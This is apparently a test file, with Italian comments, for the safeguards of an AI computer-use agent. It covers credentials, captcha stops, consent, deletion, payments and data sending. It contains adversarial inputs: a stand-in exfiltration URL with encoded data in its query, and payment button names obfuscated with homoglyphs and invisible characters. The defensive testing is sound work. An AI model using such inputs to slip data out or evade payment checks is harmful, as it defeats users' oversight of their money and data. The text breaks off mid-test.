/*
 * Computer use, le quattro protezioni (+ pagamento e invio) — modulo puro del kernel.
 * Forma approvata da Mobile, CLI, Performance il 01/11/2026: `Downloads/TALOS/computer-use/in-corso/CONTRATTI-COMPUTER-USE-V2-2026-11-01.md`
 *   §6 (tabella delle decisioni dell'owner del 31/10 e del 01/11) e `FORMA-QUATTRO-PROTEZIONI-2026-11-01.md`.
 * Codici, mai frasi (condizione CLI); politica come argomento (condizione Mobile); regex compilate una volta (condizione Performance).
 */
import test from 'node:test';
import assert from 'node:assert/strict';
import { PIENO_PRIMA_159 } from './computer-use-pieno-prima-159.mjs';
import {
  valutaAzione, intenzioniDallaFrase, POLITICHE, DECISIONI, PROTEZIONI, importiNelTesto, tettoDallaFrase, PROVE_INTERNE,
} from '../src/computer-use/protezioni.mjs';

// decisioni 156 e 159 (owner 04/11): queste prove usano Accesso pieno come rivelatore delle protezioni, con la tabella di prima;
// la tabella nuova del prodotto la fissano REV-R-25..27 (computer-use-revisione-r.test.mjs)
const PIENO = PIENO_PRIMA_159;
const SEMPRE = POLITICHE.pcConsentiSempre;
const NORMALE = POLITICHE.pcNormale;
const TELEFONO = POLITICHE.telefono;

const campoPassword = { ruolo: 'campo', nome: 'Password', segnali: { isPassword: true } };
const pulsante = (nome) => ({ ruolo: 'pulsante', nome });
const casella = (nome) => ({ ruolo: 'casella', nome });
const vuota = { elementi: [], dominio: 'biglietti.example' };
const ctx = (over = {}) => ({ richiesta: { pagare: false, inviare: false, cancellare: false }, sospetto: false, piano: { domini: [], app: [] }, ...over });

test('PROT-00: liste chiuse e risultato a codici, mai una frase', () => {
  assert.deepEqual([...DECISIONI].sort(), ['chiedi', 'ferma', 'procedi', 'procedi-e-segna', 'riscrivi', 'scegli-riservato']);
  assert.deepEqual([...PROTEZIONI].sort(), ['anti-robot', 'cancellazione', 'consenso', 'credenziale', 'invio', 'pagamento']);
  const r = valutaAzione({ azione: { tipo: 'premi' }, bersaglio: pulsante('Avanti'), schermata: vuota, politica: PIENO, contesto: ctx() });
  assert.deepEqual(r, { decisione: 'procedi', protezione: null, motivo: null, prova: null });
});

test('PROT-01: credenziale riconosciuta dalla struttura (password, autocomplete, inputType Android)', () => {
  for (const b of [campoPassword, { ruolo: 'campo', nome: 'x', segnali: { autocomplete: 'one-time-code' } },
    { ruolo: 'campo', nome: 'x', segnali: { autocomplete: 'cc-number' } }, { ruolo: 'campo', nome: 'x', segnali: { inputType: 'textPassword' } }]) {
    const r = valutaAzione({ azione: { tipo: 'scrivi', testo: '{{segreto:sito}}' }, bersaglio: b, schermata: vuota, politica: NORMALE, contesto: ctx() });
    assert.equal(r.protezione, 'credenziale', JSON.stringify(b));
    assert.equal(r.decisione, 'chiedi');
  }
});

test('PROT-02: credenziale anche dal TESTO scritto in un campo qualunque (carta con Luhn, IBAN) — condizione del Mobile', () => {
  const carta = valutaAzione({ azione: { tipo: 'scrivi', testo: '4111 1111 1111 1111' }, bersaglio: { ruolo: 'campo', nome: 'Note' }, schermata: vuota, politica: NORMALE, contesto: ctx() });
  assert.equal(carta.protezione, 'credenziale'); assert.equal(carta.motivo, 'testo-carta');
  const nonCarta = valutaAzione({ azione: { tipo: 'scrivi', testo: '4111 1111 1111 1112' }, bersaglio: { ruolo: 'campo', nome: 'Note' }, schermata: vuota, politica: NORMALE, contesto: ctx() });
  assert.equal(nonCarta.protezione, null, 'un numero lungo che non passa Luhn non è una carta');
  const iban = valutaAzione({ azione: { tipo: 'scrivi', testo: 'IT60X0542811101000000123456' }, bersaglio: { ruolo: 'campo', nome: 'Note' }, schermata: vuota, politica: NORMALE, contesto: ctx() });
  assert.equal(iban.protezione, 'credenziale'); assert.equal(iban.motivo, 'testo-iban');
});

test('PROT-03: credenziale per politica: Accesso pieno scrive e segna; telefono si ferma', () => {
  const a = { azione: { tipo: 'scrivi', testo: '{{segreto:biglietti}}' }, bersaglio: campoPassword, schermata: vuota, contesto: ctx() };
  assert.equal(valutaAzione({ ...a, politica: PIENO }).decisione, 'procedi-e-segna');
  assert.equal(valutaAzione({ ...a, politica: PIENO }).motivo, 'portachiavi');
  assert.equal(valutaAzione({ ...a, politica: TELEFONO }).decisione, 'ferma');
  // decisione 239 (owner 05/11, R1): nel luogo ricordato il segreto del portachiavi chiede sempre
  assert.equal(valutaAzione({ ...a, politica: SEMPRE }).decisione, 'chiedi');
  assert.equal(valutaAzione({ ...a, politica: SEMPRE, contesto: ctx({ sospetto: true }) }).decisione, 'chiedi', 'come il cancello di oggi: sospetto forza la conferma');
});

test('PROT-04: anti-robot si ferma a ogni livello e su ogni piattaforma', () => {
  const schermata = { elementi: [{ ruolo: 'casella', nome: 'Non sono un robot' }], dominio: 'biglietti.example' };
  for (const politica of [PIENO, SEMPRE, NORMALE, TELEFONO]) {
    const r = valutaAzione({ azione: { tipo: 'premi' }, bersaglio: pulsante('Avanti'), schermata, politica, contesto: ctx() });
    assert.equal(r.protezione, 'anti-robot', politica.nome); assert.equal(r.decisione, 'ferma', politica.nome);
  }
  // l'origine da sola deve bastare: un iframe senza nome parlante (mutante «anti-robot per origine spento» lo ha mostrato)
  const iframe = { elementi: [{ ruolo: 'finestra', nome: 'widget', origine: 'https://www.google.com/recaptcha/api2/anchor' }] };
  assert.equal(valutaAzione({ azione: { tipo: 'premi' }, bersaglio: pulsante('Avanti'), schermata: iframe, politica: PIENO, contesto: ctx() }).protezione, 'anti-robot');
});

test('PROT-05: cookie sempre l\'opzione più riservata; termini in Accesso pieno solo se il servizio è nel piano', () => {
  const cookie = valutaAzione({ azione: { tipo: 'premi' }, bersaglio: pulsante('Accetta tutto'), schermata: { elementi: [{ ruolo: 'testo', nome: 'Questo sito usa i cookie per personalizzare i contenuti' }], dominio: 'x.example' }, politica: PIENO, contesto: ctx() });
  assert.equal(cookie.protezione, 'consenso'); assert.equal(cookie.motivo, 'cookie'); assert.equal(cookie.decisione, 'scegli-riservato');
  const termini = { azione: { tipo: 'premi' }, bersaglio: casella('Accetto i termini e le condizioni'), schermata: { elementi: [], dominio: 'biglietti.example' } };
  assert.equal(valutaAzione({ ...termini, politica: PIENO, contesto: ctx({ piano: { domini: ['biglietti.example'], app: [] } }) }).decisione, 'procedi-e-segna');
  assert.equal(valutaAzione({ ...termini, politica: PIENO, contesto: ctx() }).decisione, 'ferma', 'servizio fuori dal piano della persona');
  assert.equal(valutaAzione({ ...termini, politica: NORMALE, contesto: ctx() }).decisione, 'chiedi');
  assert.equal(valutaAzione({ ...termini, politica: TELEFONO, contesto: ctx() }).decisione, 'scegli-riservato');
});

test('PROT-06: cancellazione definitiva — Accesso pieno riscrive in recuperabile se chiesta, ferma se non chiesta o con sospetto', () => {
  const shiftCanc = { azione: { tipo: 'tasti', combinazione: 'shift+delete' }, bersaglio: { ruolo: 'voce', nome: 'foto.jpg' }, schermata: vuota };
  const r = valutaAzione({ ...shiftCanc, politica: PIENO, contesto: ctx({ richiesta: { pagare: false, inviare: false, cancellare: true } }) });
  assert.equal(r.decisione, 'riscrivi'); assert.deepEqual(r.azioneSostitutiva, { tipo: 'tasti', combinazione: 'delete' });
  assert.equal(valutaAzione({ ...shiftCanc, politica: PIENO, contesto: ctx() }).decisione, 'ferma');
  const svuota = { azione: { tipo: 'premi' }, bersaglio: pulsante('Svuota cestino'), schermata: vuota };
  assert.equal(valutaAzione({ ...svuota, politica: PIENO, contesto: ctx({ richiesta: { pagare: false, inviare: false, cancellare: true } }) }).decisione, 'procedi-e-segna');
  assert.equal(valutaAzione({ ...svuota, politica: PIENO, contesto: ctx({ richiesta: { pagare: false, inviare: false, cancellare: true }, sospetto: true }) }).decisione, 'ferma');
  assert.equal(valutaAzione({ ...svuota, politica: TELEFONO, contesto: ctx({ richiesta: { pagare: false, inviare: false, cancellare: true } }) }).decisione, 'ferma');
  const dialogo = { elementi: [{ ref: 'd1', ruolo: 'finestra', nome: 'Conferma', modale: true }, { ruolo: 'testo', nome: 'Eliminare definitivamente questo file? L\'operazione non si può annullare.', finestra: 'd1' }] };
  assert.equal(valutaAzione({ azione: { tipo: 'premi' }, bersaglio: { ...pulsante('Sì'), finestra: 'd1' }, schermata: dialogo, politica: NORMALE, contesto: ctx() }).protezione, 'cancellazione');
  assert.equal(valutaAzione({ azione: { tipo: 'tasti', combinazione: 'enter' }, bersaglio: { ...pulsante('Sì'), finestra: 'd1' }, schermata: dialogo, politica: NORMALE, contesto: ctx() }).protezione, 'cancellazione', 'invio da tastiera sul dialogo');
  assert.equal(valutaAzione({ azione: { tipo: 'premi' }, bersaglio: { ...pulsante('Annulla'), finestra: 'd1' }, schermata: dialogo, politica: PIENO, contesto: ctx() }).decisione, 'procedi', 'uscire dal dialogo è sempre permesso');
  // irreversibile (radice), per sempre, tasti scritti in ogni modo
  const irr = { elementi: [{ ref: 'd2', ruolo: 'finestra', nome: 'Questa azione è irreversibile.', modale: true }] };
  assert.equal(valutaAzione({ azione: { tipo: 'premi' }, bersaglio: { ...pulsante('Sì'), finestra: 'd2' }, schermata: irr, politica: NORMALE, contesto: ctx() }).protezione, 'cancellazione');
  for (const nome of ['Delete forever', 'Elimina per sempre', 'Elimina l’account']) {
    assert.equal(valutaAzione({ azione: { tipo: 'premi' }, bersaglio: pulsante(nome), schermata: vuota, politica: NORMALE, contesto: ctx() }).protezione, 'cancellazione', nome);
  }
  for (const combinazione of ['Shift+Del', 'shift + delete', 'Maiusc+Canc', 'delete+shift', 'shift-delete', ['shift', 'delete'], 'shift+supr']) {
    assert.equal(valutaAzione({ azione: { tipo: 'tasti', combinazione }, bersaglio: null, schermata: vuota, politica: NORMALE, contesto: ctx() }).protezione, 'cancellazione', String(combinazione));
  }
  const conRipeti = valutaAzione({ azione: { tipo: 'tasti', combinazione: 'shift+delete', ripeti: 3 }, schermata: vuota, politica: PIENO, contesto: ctx({ richiesta: { cancellare: true } }) });
  assert.deepEqual(conRipeti.azioneSostitutiva, { tipo: 'tasti', combinazione: 'delete', ripeti: 3 });
});

test('PROT-06b: «dialogo irreversibile» solo in una finestra MODALE (rilievo del Mobile, 01/11)', () => {
  const impostazioni = { elementi: [{ ruolo: 'testo', nome: 'I messaggi verranno eliminati definitivamente dopo 7 giorni' }, { ruolo: 'testo', nome: 'Il giocatore ha lasciato definitivamente la squadra' }] };
  assert.equal(valutaAzione({ azione: { tipo: 'premi' }, bersaglio: pulsante('Avanti'), schermata: impostazioni, politica: PIENO, contesto: ctx() }).decisione, 'procedi');
  // due finestre modali: conta quella del bersaglio
  const due = { elementi: [{ ref: 'a', ruolo: 'finestra', nome: 'Elimina definitivamente?', modale: true }, { ref: 'b', ruolo: 'finestra', nome: 'Salva le modifiche?', stato: 'modale' }] };
  assert.equal(valutaAzione({ azione: { tipo: 'premi' }, bersaglio: { ...pulsante('Salva'), finestra: 'b' }, schermata: due, politica: PIENO, contesto: ctx() }).decisione, 'procedi');
  assert.equal(valutaAzione({ azione: { tipo: 'premi' }, bersaglio: { ...pulsante('Sì'), finestra: 'a' }, schermata: due, politica: PIENO, contesto: ctx() }).decisione, 'ferma');
});

test('PROT-07: pagamento — owner «paga solo se gliel\'hai chiesto»; telefono si ferma sempre', () => {
  const compra = { azione: { tipo: 'premi' }, bersaglio: pulsante('Acquista ora'), schermata: vuota };
  assert.equal(valutaAzione({ ...compra, politica: PIENO, contesto: ctx({ richiesta: { pagare: true, inviare: false, cancellare: false } }) }).decisione, 'procedi');
  assert.equal(valutaAzione({ ...compra, politica: PIENO, contesto: ctx() }).decisione, 'ferma');
  assert.equal(valutaAzione({ ...compra, politica: PIENO, contesto: ctx({ richiesta: { pagare: true, inviare: false, cancellare: false }, sospetto: true }) }).decisione, 'ferma');
  assert.equal(valutaAzione({ ...compra, politica: NORMALE, contesto: ctx({ richiesta: { pagare: true, inviare: false, cancellare: false } }) }).decisione, 'chiedi');
  assert.equal(valutaAzione({ ...compra, politica: TELEFONO, contesto: ctx({ richiesta: { pagare: true, inviare: false, cancellare: false } }) }).decisione, 'ferma');
});

test('PROT-08: invio di dati (pulsante, azione di uscita, indirizzo con dati in query)', () => {
  const invia = { azione: { tipo: 'premi' }, bersaglio: pulsante('Invia'), schermata: vuota };
  assert.equal(valutaAzione({ ...invia, politica: PIENO, contesto: ctx() }).decisione, 'ferma');
  assert.equal(valutaAzione({ ...invia, politica: PIENO, contesto: ctx({ richiesta: { pagare: false, inviare: true, cancellare: false } }) }).decisione, 'procedi');
  const query = 'https://raccolta.example/?d=' + 'aGVsbG8gd29ybGQgdGhpcyBpcyBkYXRh'.repeat(4);
  const r = valutaAzione({ azione: { tipo: 'apri', indirizzo: query }, bersaglio: null, schermata: vuota, politica: PIENO, contesto: ctx() });
  assert.equal(r.protezione, 'invio'); assert.equal(r.motivo, 'dati-in-indirizzo'); assert.equal(r.decisione, 'ferma');
  const normale = valutaAzione({ azione: { tipo: 'apri', indirizzo: 'https://biglietti.example/orari?da=catania&a=milano' }, bersaglio: null, schermata: vuota, politica: PIENO, contesto: ctx() });
  assert.equal(normale.protezione, null, 'una ricerca normale non è un invio');
});

test('PROT-09: politica come argomento — una politica mancante o sconosciuta non procede mai', () => {
  assert.throws(() => valutaAzione({ azione: { tipo: 'premi' }, bersaglio: pulsante('Acquista ora'), schermata: vuota, contesto: ctx() }), /politica/u);
});

test('PROT-10: intenzioni dalla frase della persona (IT/EN), solo dal suo testo', () => {
  assert.deepEqual(intenzioniDallaFrase('compra il biglietto delle 8:05 per Milano'), { pagare: true, inviare: false, cancellare: false });
  assert.deepEqual(intenzioniDallaFrase('trova il prezzo più basso delle cuffie e dimmelo'), { pagare: false, inviare: false, cancellare: false });
  assert.deepEqual(intenzioniDallaFrase('scrivi a Marco su WhatsApp che arrivo'), { pagare: false, inviare: true, cancellare: false });
  assert.deepEqual(intenzioniDallaFrase('svuota la cartella Download'), { pagare: false, inviare: false, cancellare: true });
  assert.deepEqual(intenzioniDallaFrase('please buy two tickets and email me the receipt'), { pagare: true, inviare: true, cancellare: false });
});

test('PROT-12: telefono, decisioni dell\'owner del 02/11 — invio come sul PC; IBAN dettato procede e si segna (prove del Mobile)', () => {
  assert.equal(Object.hasOwn(TELEFONO, 'invioNonDeciso'), false, 'la cella è decisa: il segnaposto non c\'è più');
  const chiesto = (k) => ctx({ richiesta: { pagare: false, inviare: false, cancellare: false, [k]: true } });
  const invia = { azione: { tipo: 'premi' }, bersaglio: pulsante('Invia'), schermata: vuota, politica: TELEFONO };
  // invio non chiesto ⇒ ferma; chiesto ⇒ procede; chiesto ma col sospetto attivo ⇒ ferma
  assert.equal(valutaAzione({ ...invia, contesto: ctx() }).decisione, 'ferma');
  assert.equal(valutaAzione({ ...invia, contesto: chiesto('inviare') }).decisione, 'procedi');
  assert.equal(valutaAzione({ ...invia, contesto: { ...chiesto('inviare'), sospetto: true } }).decisione, 'ferma');
  assert.equal(valutaAzione({ ...invia, contesto: chiesto('pagare') }).decisione, 'ferma', 'chiedere di pagare non sblocca l\'invio');
  // dati in un indirizzo: è un invio, deciso allo stesso modo
  const apri = { azione: { tipo: 'apri', indirizzo: 'https://raccolta.example/?e=mario.rossi@example.com' }, bersaglio: null, schermata: vuota, politica: TELEFONO };
  assert.equal(valutaAzione({ ...apri, contesto: ctx() }).decisione, 'ferma');
  assert.equal(valutaAzione({ ...apri, contesto: chiesto('inviare') }).decisione, 'procedi');
  // IBAN dalle parole della persona ⇒ procede e si segna; preso da una pagina ⇒ ferma
  const iban = 'IT60X0542811101000000123456';
  const scrivi = (testo) => ({ azione: { tipo: 'scrivi', testo }, bersaglio: { ruolo: 'campo', nome: 'IBAN del beneficiario' }, schermata: vuota, politica: TELEFONO });
  const dettato = valutaAzione({ ...scrivi(iban), contesto: ctx({ testoDellaPersona: `fai un bonifico di 20 euro a Marco, IBAN ${iban}` }) });
  assert.deepEqual([dettato.decisione, dettato.protezione, dettato.motivo, dettato.prova], ['procedi-e-segna', 'credenziale', 'testo-della-persona', 'iban']);
  assert.equal(valutaAzione({ ...scrivi(iban), contesto: ctx({ testoDellaPersona: 'fai un bonifico a Marco, l\'IBAN è nella sua mail' }) }).decisione, 'ferma');
  assert.equal(valutaAzione({ ...scrivi(iban), contesto: ctx() }).decisione, 'ferma', 'senza frase della persona');
  assert.equal(valutaAzione({ ...scrivi(iban), contesto: ctx({ testoDellaPersona: `bonifico a ${iban}`, sospetto: true }) }).decisione, 'ferma', 'sospetto attivo');
  // password e carte restano ferma anche se le detta la persona
  const carta = '4111111111111111';
  assert.equal(valutaAzione({ ...scrivi(carta), contesto: ctx({ testoDellaPersona: `paga con la carta ${carta}` }) }).decisione, 'ferma');
  const pw = { azione: { tipo: 'scrivi', testo: 'Primavera2026!' }, bersaglio: campoPassword, schermata: vuota, politica: TELEFONO };
  assert.equal(valutaAzione({ ...pw, contesto: ctx({ testoDellaPersona: 'entra con la password Primavera2026!' }) }).decisione, 'ferma');
  assert.equal(valutaAzione({ ...pw, azione: { tipo: 'scrivi', testo: iban }, contesto: ctx({ testoDellaPersona: `metti ${iban}` }) }).decisione, 'ferma', 'un IBAN in un campo password resta un segreto');
  const ibanNascosto = { ruolo: 'campo', nome: 'IBAN', segnali: { isPassword: true } };
  assert.equal(valutaAzione({ ...scrivi(iban), bersaglio: ibanNascosto, contesto: ctx({ testoDellaPersona: `bonifico a ${iban}` }) }).decisione, 'ferma', 'campo IBAN mascherato: la struttura vince sul nome');
  assert.equal(valutaAzione({ ...scrivi('IT60 X054 2811 1010 0000 0123 456'), contesto: ctx({ testoDellaPersona: `bonifico a IT60 X054 2811 1010 0000 0123 456` }) }).decisione, 'procedi-e-segna', 'IBAN dettato a gruppi');
  assert.equal(valutaAzione({ ...scrivi(`${iban} 1234`), contesto: ctx({ testoDellaPersona: `bonifico a ${iban} 1234` }) }).decisione, 'ferma', 'nel campo IBAN solo l\'IBAN');
  assert.equal(valutaAzione({ ...scrivi('IT00X0542811101000000123456'), contesto: ctx({ testoDellaPersona: 'bonifico a IT00X0542811101000000123456' }) }).decisione, 'ferma', 'IBAN con controllo sbagliato');
  assert.equal(valutaAzione({ ...scrivi(iban), bersaglio: { ruolo: 'campo', nome: 'Codice fiscale' }, contesto: ctx({ testoDellaPersona: `metti ${iban}` }) }).decisione, 'ferma', 'campo sensibile che non è un IBAN');
  // sul PC in Accesso pieno l'IBAN dettato era già «procedi-e-segna»: le due piattaforme ora coincidono
  assert.equal(valutaAzione({ ...scrivi(iban), politica: PIENO, contesto: ctx({ testoDellaPersona: `bonifico a ${iban}` }) }).decisione, 'procedi-e-segna');
});

// ---------- giro di cure del 01/11 notte: revisione avversaria di 57156ae6a ----------
const chiesto = (k) => ctx({ richiesta: { pagare: false, inviare: false, cancellare: false, [k]: true } });

test('PROT-13: conferme da TASTIERA passano dagli stessi controlli dei pulsanti (critico 1)', () => {
  const casi = [
    [{ tipo: 'tasti', combinazione: 'enter' }, pulsante('Invia'), 'invio'],
    [{ tipo: 'tasti', combinazione: 'enter' }, pulsante('Paga ora'), 'pagamento'],
    [{ tipo: 'tasti', combinazione: 'ctrl+enter' }, { ruolo: 'campo', nome: 'Corpo del messaggio' }, 'invio'],
    [{ tipo: 'tasti', combinazione: 'alt+s' }, { ruolo: 'campo', nome: 'x' }, 'invio'],
    [{ tipo: 'scrivi', testo: 'ciao, ecco i dati\n' }, { ruolo: 'campo', nome: 'Scrivi un messaggio' }, 'invio'],
  ];
  for (const [azione, bersaglio, protezione] of casi) {
    const r = valutaAzione({ azione, bersaglio, schermata: vuota, politica: PIENO, contesto: ctx() });
    assert.equal(r.protezione, protezione, JSON.stringify(azione)); assert.equal(r.decisione, 'ferma', JSON.stringify(azione));
  }
  // invio in un campo qualunque di una pagina di cassa = pagamento; in un documento normale = niente
  const cassa = { elementi: [{ ruolo: 'campo', nome: 'Numero carta', segnali: { autocomplete: 'cc-number' } }] };
  assert.equal(valutaAzione({ azione: { tipo: 'tasti', combinazione: 'enter' }, bersaglio: { ruolo: 'campo', nome: 'CAP' }, schermata: cassa, politica: PIENO, contesto: ctx() }).protezione, 'pagamento');
  assert.equal(valutaAzione({ azione: { tipo: 'scrivi', testo: 'riga uno\nriga due' }, bersaglio: { ruolo: 'campo', nome: 'Documento' }, schermata: vuota, politica: PIENO, contesto: ctx() }).decisione, 'procedi');
  assert.equal(valutaAzione({ azione: { tipo: 'tasti', combinazione: 'enter' }, bersaglio: { ruolo: 'campo', nome: 'Cerca' }, schermata: vuota, politica: PIENO, contesto: ctx() }).decisione, 'procedi');
});

test('PROT-14: intenzioni — negazioni e parole a due sensi non sbloccano niente (critico 2)', () => {
  const nulla = { pagare: false, inviare: false, cancellare: false };
  for (const f of ['non pagare niente, dimmi solo il prezzo', "don't buy anything", 'do not send the email yet', 'non cancellare niente',
    'ordina i file per data', 'rename the files in alphabetical order', 'pay attention to the dates', 'carica la pagina di nuovo',
    'leggi il post sul blog', 'rimuovi il filtro', 'rispondi alla mia domanda: quanto costa?', 'cerca come si cancella un account (non farlo)',
    'share price of Apple', 'controlla chi ha condiviso il file']) {
    assert.deepEqual(intenzioniDallaFrase(f), nulla, f);
  }
  assert.deepEqual(intenzioniDallaFrase('compra le cuffie più economiche (non farlo davvero)'), nulla, '«non farlo» annulla tutta la frase');
  assert.equal(intenzioniDallaFrase('prenota il volo per Roma').pagare, true);
  assert.equal(intenzioniDallaFrase('mandagli la foto').inviare, true);
  assert.equal(intenzioniDallaFrase('butta nel cestino le foto vecchie').cancellare, true);
});

test('PROT-15: pulsanti di pagamento normalizzati e allargati; «Invia» in cassa è un pagamento anche sul telefono (critico 3)', () => {
  for (const nome of ['Conferma pagamento', 'Conferma acquisto', 'Ordina ora', 'Order now', 'Buy', 'Purchase', 'PayPal', 'Paga con PayPal',
    'Completa l\u2019acquisto', 'P\u0430ga ora', 'Acq\u200buista ora', '\uFF30\uFF21\uFF39 \uFF2E\uFF2F\uFF37', 'Invia ordine', 'Jetzt kaufen',
    'Pa\u00ADga ora', 'Acqui\u00ADsta ora']) { // revisione unica 03/11: il trattino nascosto U+00AD che le pagine mettono per andare a capo
    assert.equal(valutaAzione({ azione: { tipo: 'premi' }, bersaglio: pulsante(nome), schermata: vuota, politica: TELEFONO, contesto: ctx() }).decisione, 'ferma', nome);
  }
  assert.equal(valutaAzione({ azione: { tipo: 'premi' }, bersaglio: pulsante('Ordina per prezzo'), schermata: vuota, politica: PIENO, contesto: ctx() }).decisione, 'procedi', 'ordinare un elenco non è pagare');
  const cassa = { elementi: [{ ruolo: 'campo', nome: 'Numero carta', segnali: { autocomplete: 'cc-number' } }] };
  assert.equal(valutaAzione({ azione: { tipo: 'premi' }, bersaglio: pulsante('Invia'), schermata: cassa, politica: TELEFONO, contesto: ctx() }).protezione, 'pagamento');
  // condizione del Mobile (01/11 notte): la cassa si legge dai CAMPI e dal TITOLO, mai dal testo di un messaggio in chat
  const chat = { elementi: [{ ruolo: 'testo', nome: 'Marco: ho cambiato il metodo di pagamento, ecco il riepilogo ordine' }, { ruolo: 'campo', nome: 'Scrivi un messaggio' }] };
  assert.equal(valutaAzione({ azione: { tipo: 'premi' }, bersaglio: pulsante('Invia'), schermata: chat, politica: TELEFONO, contesto: ctx() }).protezione, 'invio');
  const titolo = { elementi: [{ ref: 'w', ruolo: 'finestra', nome: 'Checkout - Negozio' }] };
  assert.equal(valutaAzione({ azione: { tipo: 'premi' }, bersaglio: { ...pulsante('Continua'), finestra: 'w' }, schermata: titolo, politica: TELEFONO, contesto: ctx() }).protezione, 'pagamento');
});

test('PROT-16: telefono «invio» chiuso col sospetto anche se chiesto (alto 5)', () => {
  assert.equal(valutaAzione({ azione: { tipo: 'premi' }, bersaglio: pulsante('Invia'), schermata: vuota, politica: TELEFONO, contesto: { ...chiesto('inviare'), sospetto: true } }).decisione, 'ferma');
});

test('PROT-17: carte e IBAN in qualunque punto del testo, scritti in qualunque modo (alto 6)', () => {
  for (const testo of ['4111.1111.1111.1111', '4111\u00a01111\u00a01111\u00a01111', '4111  1111  1111  1111', '4111\u20131111\u20131111\u20131111',
    '4111\u200b1111\u200b1111\u200b1111', '\uFF14\uFF11\uFF11\uFF11\uFF11\uFF11\uFF11\uFF11\uFF11\uFF11\uFF11\uFF11\uFF11\uFF11\uFF11\uFF11', '1 4111 1111 1111 1111',
    'ordine 12345678901234 carta 4111111111111111', 'tel 3331234567 4111111111111111', '4111/1111/1111/1111', ['4111', '1111', '1111', '1111']]) {
    assert.equal(valutaAzione({ azione: { tipo: 'scrivi', testo }, bersaglio: { ruolo: 'campo', nome: 'Note' }, schermata: vuota, politica: NORMALE, contesto: ctx() }).motivo, 'testo-carta', String(testo));
  }
  for (const testo of ['it60x0542811101000000123456', 'Il mio IBAN IT60X0542811101000000123456', 'IT60X0542811101000000123456 grazie',
    'IT60-X054-2811-1010-0000-0123-456', 'bonifico a IT60X0542811101000000123456.']) {
    assert.equal(valutaAzione({ azione: { tipo: 'scrivi', testo }, bersaglio: { ruolo: 'campo', nome: 'Note' }, schermata: vuota, politica: NORMALE, contesto: ctx() }).motivo, 'testo-iban', testo);
  }
  assert.equal(valutaAzione({ azione: { tipo: 'scrivi', testo: 'IT60X0542811101000000123457' }, bersaglio: { ruolo: 'campo', nome: 'Note' }, schermata: vuota, politica: NORMALE, contesto: ctx() }).protezione, null, 'IBAN con controllo sbagliato');
});

test('PROT-18: campi delle credenziali e segreti in Accesso pieno solo dal portachiavi o dalla persona (alti 7 e 11)', () => {
  for (const segnali of [{ type: 'password' }, { autocomplete: 'CURRENT-PASSWORD' }, { autocomplete: 'section-login current-password' }, { autocomplete: 'billing cc-number' }, { autocomplete: 'cc-type' }]) {
    assert.equal(valutaAzione({ azione: { tipo: 'scrivi', testo: 'x' }, bersaglio: { ruolo: 'campo', nome: '', segnali }, schermata: vuota, politica: NORMALE, contesto: ctx() }).protezione, 'credenziale', JSON.stringify(segnali));
  }
  for (const nome of ['pwd', 'Mot de passe', 'Codice di sicurezza', 'Numero carta', 'Card number']) {
    assert.equal(valutaAzione({ azione: { tipo: 'scrivi', testo: 'x' }, bersaglio: { ruolo: 'campo', nome }, schermata: vuota, politica: NORMALE, contesto: ctx() }).protezione, 'credenziale', nome);
  }
  assert.equal(valutaAzione({ azione: { tipo: 'scrivi', testo: '483920' }, bersaglio: { ruolo: 'campo', nome: 'Codice' }, schermata: vuota, politica: NORMALE, contesto: ctx() }).motivo, 'codice');
  assert.equal(valutaAzione({ azione: { tipo: 'scrivi', testo: '{{SEGRETO:banca}}' }, bersaglio: { ruolo: 'campo', nome: 'Note' }, schermata: vuota, politica: PIENO, contesto: ctx() }).motivo, 'portachiavi');
  // Accesso pieno: password in chiaro, carta nelle note, qualunque segreto col sospetto ⇒ ferma
  assert.equal(valutaAzione({ azione: { tipo: 'scrivi', testo: 'hunter2' }, bersaglio: campoPassword, schermata: vuota, politica: PIENO, contesto: ctx() }).decisione, 'ferma');
  assert.equal(valutaAzione({ azione: { tipo: 'scrivi', testo: '4111 1111 1111 1111' }, bersaglio: { ruolo: 'campo', nome: 'Note' }, schermata: vuota, politica: PIENO, contesto: ctx() }).decisione, 'ferma');
  assert.equal(valutaAzione({ azione: { tipo: 'scrivi', testo: '{{segreto:sito}}' }, bersaglio: campoPassword, schermata: vuota, politica: PIENO, contesto: ctx({ sospetto: true }) }).decisione, 'ferma');
  // l'IBAN dettato dalla persona si scrive (e si segna)
  const bonifico = valutaAzione({ azione: { tipo: 'scrivi', testo: 'IT60 X054 2811 1010 0000 0123 456' }, bersaglio: { ruolo: 'campo', nome: 'IBAN beneficiario' }, schermata: vuota, politica: PIENO, contesto: ctx({ testoDellaPersona: 'fai un bonifico di 20 euro a IT60X0542811101000000123456' }) });
  assert.equal(bonifico.motivo, 'testo-della-persona'); assert.equal(bonifico.decisione, 'procedi-e-segna');
});

test('PROT-19: anti-robot — si esce sempre, il badge invisibile non è una sfida, i controlli nuovi si vedono (alto 8, rilievo del Mobile)', () => {
  const captcha = { elementi: [{ ruolo: 'casella', nome: 'Non sono un robot' }] };
  for (const azione of [{ tipo: 'sistema', dove: 'indietro' }, { tipo: 'scorri', direzione: 'giu' }, { tipo: 'tasti', combinazione: 'Esc' }, { tipo: 'tasti', combinazione: 'alt+F4' }, { tipo: 'tasti', combinazione: 'ctrl+w' }, { tipo: 'tasti', combinazione: 'alt+left' }, { tipo: 'apri', indirizzo: 'https://altro.example/' }]) {
    assert.equal(valutaAzione({ azione, bersaglio: null, schermata: captcha, politica: TELEFONO, contesto: ctx() }).decisione, 'procedi', JSON.stringify(azione));
  }
  assert.equal(valutaAzione({ azione: { tipo: 'premi' }, bersaglio: casella('Non sono un robot'), schermata: captcha, politica: PIENO, contesto: ctx() }).decisione, 'ferma', 'il clic sul controllo resta fermo');
  for (const el of [{ ruolo: 'testo', nome: 'This site is protected by reCAPTCHA and the Google Privacy Policy and Terms of Service apply.' }, { ruolo: 'finestra', nome: 'reCAPTCHA', origine: 'https://www.google.com/recaptcha/api2/anchor?size=invisible' }]) {
    assert.equal(valutaAzione({ azione: { tipo: 'scrivi', testo: '{{segreto:sito}}' }, bersaglio: campoPassword, schermata: { elementi: [el] }, politica: SEMPRE, contesto: ctx() }).decisione, 'chiedi', el.nome); // non è anti-robot (ferma): chiede come ogni segreto dopo la 239
  }
  for (const el of [{ nome: 'I\u2019m not a robot' }, { nome: 'Verifica di essere un essere umano' }, { nome: 'w', origine: 'https://geo.captcha-delivery.com/captcha/' }, { nome: 'w', origine: 'https://client-api.arkoselabs.com/fc/' }, { nome: 'Press & Hold' }, { nome: 'capt\u200bcha' }, { nome: '', valore: 'Non sono un robot' }]) {
